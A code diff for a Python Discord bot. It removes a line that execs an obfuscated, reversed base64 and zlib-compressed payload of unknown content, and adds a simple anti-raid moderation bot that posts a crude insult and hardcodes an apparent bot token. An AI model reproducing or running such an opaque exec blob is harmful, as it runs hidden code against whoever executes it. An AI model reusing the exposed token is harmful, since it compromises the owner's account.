@@ -1,2 +1,65 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import discord
+from discord.ext import commands
+
+Intents = discord.Intents.default()
+Intents.members = True 
+Intents.message_content = True 
+
+bot = commands.Bot(command_prefix="!", intents=Intents)
+
+warned_users = {}
+
+EXEMPT_ROLES = [1350172437291208754, 1329362352784539749]
+EXEMPT_USERS = [1328697094550327366, 1416429825253572638, 430779566747811843]
+
+@bot.event
+async def on_ready():
+    print(f'Bot {bot.user.name} sistemi korumaya hazır!')
+
+@bot.event
+async def on_message(message):
+    if message.author.bot or message.guild is None:
+        return
+
+    if message.author.id in EXEMPT_USERS:
+        await bot.process_commands(message)
+        return
+
+    user_roles = [role.id for role in message.author.roles]
+    is_exempt = False
+    for role_id in EXEMPT_ROLES:
+        if role_id in user_roles:
+            is_exempt = True
+            break
+    
+    if is_exempt:
+        await bot.process_commands(message)
+        return
+
+    content = message.content.lower()
+    user_id = message.author.id
+    is_violation = False
+    
+    if "raid" in content:
+        is_violation = True
+    elif "@everyone" in message.content or "@here" in message.content:
+        is_violation = True
+    elif "http://" in content or "https://" in content or "discord.gg/" in content:
+        is_violation = True
+
+    if is_violation:
+        if user_id in warned_users:
+            try:
+                await message.author.edit(roles=[])
+                await message.channel.set_permissions(message.author, send_messages=False)
+                await message.channel.send(f"⚠️ {message.author.mention}, LOL FUCKING L RAIDER LIL BOZO")
+                del warned_users[user_id]
+            except discord.Forbidden:
+                await message.channel.send("Error:404")
+        else:
+            warned_users[user_id] = True
+            await message.channel.send(f"⚠️ {message.author.mention}, Don't Say That Word, Tag Everyone or Post Links!", delete_after=10)
+
+    await bot.process_commands(message)
+
+bot.run('MTM0MDc0MjM0ODE3NDI2NjUxMA.GAH3Ug.yYj2DlIe5gGAf7ygEeN-xmaIp4RYNVrFzDNjrk')
